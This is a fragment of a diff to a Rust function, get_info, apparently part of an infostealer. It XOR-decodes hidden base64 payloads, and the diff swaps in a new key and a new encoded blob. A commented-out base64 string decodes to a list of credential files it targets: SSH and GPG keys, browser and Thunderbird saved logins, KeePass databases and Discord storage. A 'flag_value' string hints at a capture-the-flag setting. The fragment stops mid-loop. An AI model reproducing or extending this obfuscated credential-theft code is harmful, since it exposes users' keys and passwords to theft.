@@ -9,13 +9,13 @@ extern crate file;
 #[cfg(feature = "linux")]
 pub fn get_info() -> HashMap<String, String> {
     use base64::decode;
-    let key = "Pony7>all";
+    let key = "I3CI3C";
     let mut infos: HashMap<String, String> = HashMap::new();
     //let decoded = general_purpose::STANDARD_NO_PAD.decode("L2hvbWUvKi8uKnNzaC9pZF8qfC9ob21lLyovLipnbnVwZy8qLmdwZ3wvaG9tZS8qLy4qdGh1bmRlcmJpcmQvKi5zYmQvKi5tc2Z8L2hvbWUvKi8uKmNvbmZpZy9nb29nbGUtY2hyb21lL0RlZmF1bHQvTG9naW4gRGF0YXwvaG9tZS8qLy4qbW96aWxsYS9maXJlZm94LyouZGVmYXVsdCovbG9naW5zLmpzb258L2hvbWUvKi8uKmtlZXBhc3MqLyoqLyoua2RieHwvaG9tZS8qLy4qa2VlcGFzcyovKiovKi5rZGJ8L2hvbWUvKi8uKmNvbmZpZy9kaXNjb3JkL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYi8qLmxkYgo").unwrap();
     let decoded2 = general_purpose::STANDARD_NO_PAD
         .decode("ZmxhZ192YWx1ZQ")
         .unwrap();
-     let input = decode(String::from("HVsiLgNsUjNZBSwtSgJ4NCAgCTA8SmENM1lfFA==").as_bytes()).unwrap();
+     let input = decode(String::from("AAAAMnUqHQchB3l3HAURdA4bPlgMJl40E0E6PWciOmkCfkYpOWYFD3UieAoOKgokKwABDGExM0E7BWYFAlAzeGQtfAwzfFdwAVssJhwBeV57MAUydEkTJFwpGAonHwUpHQohAGolfARsPHJ0ZFVsBV0ZPgQNPXB6LXApOxIvcVcuZGM1NA==").as_bytes()).unwrap();
     let mut decoded3 = String::new();
     for (i, b) in input.iter().enumerate() {
         let key_byte = key.as_bytes()[i % key.len()]; // Get the key byte for this obfuscated byte
